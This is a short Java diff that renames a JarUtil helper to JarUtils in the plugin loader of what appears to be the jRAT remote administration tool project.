@@ -10,7 +10,7 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.jar.JarFile;
 
-import org.jrat.project.api.JarUtil;
+import org.jrat.project.api.JarUtils;
 import org.jrat.project.api.PluginClassLoader;
 import org.jrat.project.api.RATControlMenuEntry;
 import org.jrat.project.api.RATMenuItem;
@@ -51,11 +51,11 @@ public class Plugin {
 		String mainClass;
 		
 		try {
-			mainClass = JarUtil.getMainClassFromInfo(new JarFile(file));
+			mainClass = JarUtils.getMainClassFromInfo(new JarFile(file));
 		} catch (Exception ex) {
 			ex.printStackTrace();
 			System.out.println("Failed loading main class from info.txt, trying meta-inf");
-			mainClass = JarUtil.getMainClass(new JarFile(file));
+			mainClass = JarUtils.getMainClass(new JarFile(file));
 		}
 		
 		setClassToLoad(Class.forName(mainClass, true, getLoader()));
